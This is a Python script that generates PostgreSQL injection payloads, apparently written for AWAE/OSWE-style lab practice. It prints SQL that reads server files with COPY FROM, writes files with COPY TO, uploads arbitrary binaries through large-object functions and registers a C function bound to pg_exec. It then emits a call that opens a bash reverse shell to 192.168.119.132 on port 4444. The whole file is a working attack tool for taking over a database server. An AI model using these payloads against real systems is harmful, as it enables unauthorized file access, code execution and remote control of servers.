import argparse
import binascii

def parse_args():
    parser = argparse.ArgumentParser()
    parser.add_argument('-U', '--upload', dest='upload', required=False, help='upload file with largeobject (I)')
    parser.add_argument('-p', '--path', dest='path', required=False, help='upload file with largeobject (I)')
    parser.add_argument('-C', '--create-fn', dest='udf', required=False, help='create function with udf specified')
    return parser.parse_args()

def read_text(filepath):
    return """CREATE TABLE awae(content text);
COPY awae FROM '%s';
SELECT content from awae;
drop table awae;""" % filepath

def write_text(data, filepath):
    print("WArning: cannot contain \\t, \\n, \\r,,..\n")
    return "COPY (select '%s') TO '%s';" % (data, filepath)

def upload_with_lo(data, filepath, loid=None, page=2048):
    s = []
    loid = loid or 4444
    assert loid < 9999, "large object id too large"
    s.append('select lo_unlink(%s);' % loid)
    s.append('select lo_create(%s);' % loid)
    for i in range(0, len(data), page):
        s.append("select lo_put(%s, %d, '\\x%s');" % (loid, i, binascii.hexlify(data[i:i+page])))
    s.append("select lo_export(%s, '%s');" % (loid, filepath))
    s.append("select lo_unlink(%s);" % loid)
    return '\n'.join(s)

def create_udf(filepath):
    s = "DROP FUNCTION IF EXISTS sys(cstring);"
    return s + "CREATE FUNCTION sys(cstring) RETURNS int AS '%s', 'pg_exec' LANGUAGE C STRICT;" % filepath

host, port = '192.168.119.132', 4444

if __name__ == '__main__':
    args = parse_args()

    if args.upload:
        if not args.path:
            print('Large Object Upload must specify an output path ( -p <path-to-write> ) to Export')
            exit(1)
        data = open(args.upload, 'rb').read()
        print(upload_with_lo(data, args.path))
    elif args.udf:
        print(create_udf(args.udf))
        print("SELECT sys('bash -c \"bash -i >& /dev/tcp/%s/%s 0>&1\"');" % (host, port))
    else:
        print("read_text\n")
        print(read_text("c:\\windows\\win.ini"))
        print("\nwrite_text\n")
        print(write_text("hello world", "D:\\awae.txt"))

